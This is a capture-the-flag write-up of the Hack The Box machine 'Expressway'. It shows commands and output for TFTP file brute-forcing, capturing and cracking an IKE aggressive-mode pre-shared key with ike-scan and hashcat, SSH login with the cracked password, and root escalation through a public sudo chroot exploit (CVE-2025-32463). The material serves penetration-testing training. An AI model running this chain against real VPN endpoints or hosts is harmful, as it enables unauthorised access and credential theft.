---
title: "Expressway Writeup"
permalink: /season_9/Expressway.md
box:
  machine_name: "Expressway"
  release: "20 Sep 2025"
  retire: "07 Mar 2026"
  os: "Linux"
  base_points: "Easy [20]"
  first_blood_user: "00:07:26 — VXXDXX (Elite Hacker)"
  first_blood_root: "00:15:30 — D4rKaCe (Elite Hacker)"
  creator: "dakkmaddy (Elite Hacker)"
  machine_url: "https://www.hackthebox.com/machines/expressway"
---
Using nmap I scanned the box and found that only ssh is up on port 22
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/expressway]
└─$ nmap -sV -sC -Pn 10.129.238.52
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-29 17:27 -0500
Nmap scan report for 10.129.238.52
Host is up (0.22s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
```

Since that doesn't give much to work with I scanned for UDP ports and found tftp (port 69) and IPsec/IKE VPN (port 500)
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/expressway]
└─$ nmap -sU 10.129.238.52 
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-29 17:43 -0500
Nmap scan report for 10.129.238.52
Host is up (0.22s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 1029.08 seconds
```

I first tried to use tftpbrute using metasploit to find any sensitive files that could help me. I found a Sicsortr.cfg file that shows me there is a user named  `ike` but didn't get anything else after that.
###### tftpbrute
```
msf auxiliary(scanner/tftp/tftpbrute) > set RHOSTS 10.129.238.52
RHOSTS => 10.129.238.52
msf auxiliary(scanner/tftp/tftpbrute) > run
[+] Found ciscortr.cfg on 10.129.238.52
[+] Found code.img on 10.129.238.52
[+] Found device-config on 10.129.238.52
[+] Found P0S3-08-2-00.loads on 10.129.238.52
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

###### Ciscortr.cfg content
```
version 12.3

no service pad

service timestamps debug datetime msec

service timestamps log datetime msec

no service password-encryption

!

hostname expressway

!

boot-start-marker

boot-end-marker

!

enable password *****

!

username ike password *****

ip subnet-zero

ip cef

!

vpdn enable

        vpdn-group 1

        request-dialin

        protocol pppoe



!

ip dhcp excluded-address 10.0.1.1 10.0.1.10

ip dhcp excluded-address 10.0.2.1 10.0.2.10

ip dhcp excluded-address 10.0.3.1 10.0.3.10

!

ip dhcp pool vlan1

   network 10.0.1.0 255.255.255.0

   default-router 10.0.1.1 

!

ip dhcp pool vlan2

   network 10.0.2.0 255.255.255.0

   default-router 10.0.2.1 

!

ip dhcp pool vlan3

   network 10.0.3.0 255.255.255.0

   default-router 10.0.3.1 

!

ip ips po max-events 100

no ftp-server write-enable

!

bridge irb

!

interface FastEthernet0

        no ip address

!

interface FastEthernet1

        no ip address

!

interface FastEthernet2

        no ip address

!

interface FastEthernet3

        switchport mode trunk

        no ip address

!

interface FastEthernet4

        ip address 192.168.68.1 255.255.255.0

        no ip directed-broadcast (default)

        speed auto

        ip nat outside

        ip access-group 103 in

        no cdp enable

        crypto ipsec client ezvpn ezvpnclient outside

        crypto map static-map

!

crypto isakmp policy 1

        encryption 3des

        authentication pre-share

        group 2

        lifetime 480

!

crypto isakmp client configuration group rtr-remote

        key secret-password

        dns 208.67.222.222

        domain expressway.htb

        pool dynpool

!

crypto ipsec transform-set vpn1 esp-3des esp-md5

!

crypto ipsec security-association lifetime seconds 86400

!

crypto dynamic-map dynmap 1

        set transform-set vpn1

        reverse-route

!

crypto map static-map 1 ipsec-isakmp dynamic dynmap

crypto map dynmap isakmp authorization list rtr-remote

crypto map dynmap client configuration address respond

crypto ipsec client ezvpn ezvpnclient

        connect auto

        group 2 key secret-password

        mode client

        peer 192.168.100.1

!

interface Dot11Radio0

        no ip address

        !

        broadcast-key vlan 1 change 45

        !

        encryption vlan 1 mode ciphers tkip 

        !

        ssid cisco

                vlan 1

                authentication open 

                authentication network-eap eap_methods 

                authentication key-management wpa optional

        !

        ssid ciscowep

                vlan 2

                authentication open 

                !

        ssid ciscowpa

                vlan 3

                authentication open 

        !

        speed basic-1.0 basic-2.0 basic-5.5 6.0 9.0 basic-11.0 12.0 18.0 24.0 36.0 48.0 54.0

        rts threshold 2312

        power local cck 50

        power local ofdm 30

        channel 2462

        station-role root

!

interface Dot11Radio0.1

        description Cisco Open

        encapsulation dot1Q 1 native

        no cdp enable

        bridge-group 1

        bridge-group 1 subscriber-loop-control

        bridge-group 1 spanning-disabled

        bridge-group 1 block-unknown-source

        no bridge-group 1 source-learning

        no bridge-group 1 unicast-flooding

!

interface Dot11Radio0.2

        encapsulation dot1Q 2

        bridge-group 2

        bridge-group 2 subscriber-loop-control

        bridge-group 2 spanning-disabled

        bridge-group 2 block-unknown-source

        no bridge-group 2 source-learning

        no bridge-group 2 unicast-flooding

!

interface Dot11Radio0.3

        encapsulation dot1Q 3

        bridge-group 3

        bridge-group 3 subscriber-loop-control

        bridge-group 3 spanning-disabled

        bridge-group 3 block-unknown-source

        no bridge-group 3 source-learning

        no bridge-group 3 unicast-flooding

!

interface Vlan1

        no ip address

        no ip directed-broadcast (default)

        ip nat inside

        crypto ipsec client ezvpn ezvpnclient inside

        ip inspect firewall in

        no cdp enable

        bridge-group 1

        bridge-group 1 spanning-disabled

!

interface Vlan2

        no ip address

        bridge-group 2

        bridge-group 2 spanning-disabled

!

interface Vlan3

        no ip address

        bridge-group 3

        bridge-group 3 spanning-disabled

!

interface BVI1

        ip address 10.0.1.1 255.255.255.0

!

interface BVI2

        ip address 10.0.2.1 255.255.255.0

!

ip classless

!

ip http server

no ip http secure-server

!

control-plane

!

bridge 1 route ip

bridge 2 route ip

bridge 3 route ip

!

ip inspect name firewall tcp

ip inspect name firewall udp

!

access-list 103 permit udp host 200.1.1.1 any eq isakmp

access-list 103 permit udp host 200.1.1.1 eq isakmp any

no cdp run

!

line con 0

        password *****

        no modem enable

        transport preferred all

        transport output all

line aux 0

        transport preferred all

        transport output all

line vty 0 4

        password *****

        transport preferred all

        transport input all

        transport output all
```

Using a tool named `ike-scan` to enumerate the IKE on port 500. We see that the `ike` user is definitely available. I specifically used an `Aggressive` scan to check for peer identities in the exchange.
###### Aggressive IKE Scan
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/expressway]
└─$ ike-scan -M -A 10.129.238.52
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned
        HDR=(CKY-R=c66a946fbb0c0c00)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.230 seconds (4.36 hosts/sec).  1 returned handshake; 0 returned notify
```

For `ike-scan`, there is a flag named `--pskcrack` that captures the hash of the Pre-Shared Key used by IPsec's VPN if we were to use an aggresive scan.
###### Aggressive scan with --pskcrack
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/expressway]
└─$ ike-scan -M -A 10.129.238.52 --pskcrack=pskcrack.txt
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned
        HDR=(CKY-R=a365dbfc23e1d533)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.229 seconds (4.37 hosts/sec).  1 returned handshake; 0 returned notify
```
###### Hashed PSK
```
35ca1c3a8b873a7059613a17fa007c5919686d607eb016a1ef3d19492ed29296ead82472127f15706b1826298b2863f2b09c9d9a123d7bbcf9216013433964af99c18275d1535c4080b8c12e63668dbd6e73c3d1b0c78530e8fcaae7a4d5f562fa38aba3d15eb7589e59cd46f67a1208847d41362231e66e1265b8c008e2544f:c3c69ddbefcccb3ab29efcbc3c356ddab6702fe76d15209c8908c309672976959f968c944d1b6a1cf66ff8f7ca942c249ae49f94d4435c6da4e9b7cdc4fc6119b07823c54ea506a145c111db8218075221b4a8c0a10ec423420eeb3a81bcb4d627555d750a6924214aef579e9b7dae6d29327490313b37cd5c1622dc1f462c7f:a365dbfc23e1d533:7f15d4af2e64db49:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:b02aa9b5d01a0b9bbdf194dc5834bd3893aabb67:6d5116ffec81cbe216c8a768aa41d63b30fe443aafeabde7488559930faad670:7827fe55f926f7cd6ab63002462aa52aa50c1f94
```

I then used `hashcat` to try and crack the hash and got a hit `freakingrockstarontheroad`
###### Hashcat output
```
┌──(kali㉿kali)-[~/HTB_Labs/season_9/expressway]
└─$ hashcat -a 0 -m 5400 pskcrack.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 9 7950X3D 16-Core Processor, 15009/30018 MB (4096 MB allocatable), 8MCU

/home/kali/.local/share/hashcat/hashcat.dictstat2: Outdated header version, ignoring content
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (29730 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

35ca1c3a8b873a7059613a17fa007c5919686d607eb016a1ef3d19492ed29296ead82472127f15706b1826298b2863f2b09c9d9a123d7bbcf9216013433964af99c18275d1535c4080b8c12e63668dbd6e73c3d1b0c78530e8fcaae7a4d5f562fa38aba3d15eb7589e59cd46f67a1208847d41362231e66e1265b8c008e2544f:c3c69ddbefcccb3ab29efcbc3c356ddab6702fe76d15209c8908c309672976959f968c944d1b6a1cf66ff8f7ca942c249ae49f94d4435c6da4e9b7cdc4fc6119b07823c54ea506a145c111db8218075221b4a8c0a10ec423420eeb3a81bcb4d627555d750a6924214aef579e9b7dae6d29327490313b37cd5c1622dc1f462c7f:a365dbfc23e1d533:7f15d4af2e64db49:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:b02aa9b5d01a0b9bbdf194dc5834bd3893aabb67:6d5116ffec81cbe216c8a768aa41d63b30fe443aafeabde7488559930faad670:7827fe55f926f7cd6ab63002462aa52aa50c1f94:freakingrockstarontheroad
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5400 (IKE-PSK SHA1)
Hash.Target......: 35ca1c3a8b873a7059613a17fa007c5919686d607eb016a1ef3...0c1f94
Time.Started.....: Tue Dec 30 19:39:55 2025 (2 secs)
Time.Estimated...: Tue Dec 30 19:39:57 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  4219.2 kH/s (1.09ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8052736/14344385 (56.14%)
Rejected.........: 0/8052736 (0.00%)
Restore.Point....: 8044544/14344385 (56.08%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: freaky97 -> franchiscoymary89
Hardware.Mon.#01.: Util: 28%

Started: Tue Dec 30 19:39:40 2025
Stopped: Tue Dec 30 19:39:57 2025
```

Using this user/pass combination of ike:freakingrockstarontheroad, we were able to log in via ssh and get the user flag.
```
ike@expressway:~$ cat user.txt
d3703f639b2d1c2727448a3558b609b0
```

I first check sudo privileges. However, our user cannot run any sudo commands. I also couldn't find anything within the `.ssh` directory, so I decided to move on.

Looking through some binaries I found one named `exim4` which is a mail transport agent. I checked the version of this and it seemed to be the msot recent version.
```
ike@expressway:/usr/sbin$ ./exim4 --version
Exim version 4.98.2 #2 built 14-Aug-2025 11:58:16
Copyright (c) University of Cambridge, 1995 - 2018
(c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2024
Hints DB:
 Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)
Support for: crypteq iconv() IPv6 GnuTLS move_frozen_messages TLS_resume DANE DKIM DNSSEC ESMTP_Limits ESMTP_Wellknown Event I18N OCSP PIPECONNECT PRDR Queue_Ramp SOCKS SRS TCP_Fast_Open
Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd
Authenticators: cram_md5 external plaintext
Routers: accept dnslookup ipliteral manualroute queryprogram redirect
Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp
Fixed never_users: 0
Configure owner: 0:0
Size of off_t: 8
Configuration file search path is /etc/exim4/exim4.conf:/var/lib/exim4/config.autogenerated
Configuration file is /var/lib/exim4/config.autogenerated
```
There are privilege escalation methods for this binary, but the only recent PoC I found online [went up to 4.91](https://www.exploit-db.com/exploits/46996) so I decided to move on.

Going back to the sudo binary, I used the `which` command to check the path and found that the sudo instance found on this device is not in the default location.
```
ike@expressway:/usr/sbin$ which sudo
/usr/local/bin/sudo
```

Checking the version of sudo, I found that this box is using an older version, which I found is vulnerable to [this specific PoC](https://www.upwind.io/feed/cve%E2%80%912025%E2%80%9132463-critical-sudo-chroot-privilege-escalation-flaw)
```
ike@expressway:/usr/sbin$ /usr/local/bin/sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

Transferring the script in the machine and running it, I was able to escalate my privileges as root and get the root flag
```
ike@expressway:~/files/CVE-2025-32463_chwoot$ ./sudo-chwoot.sh id
woot!
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```
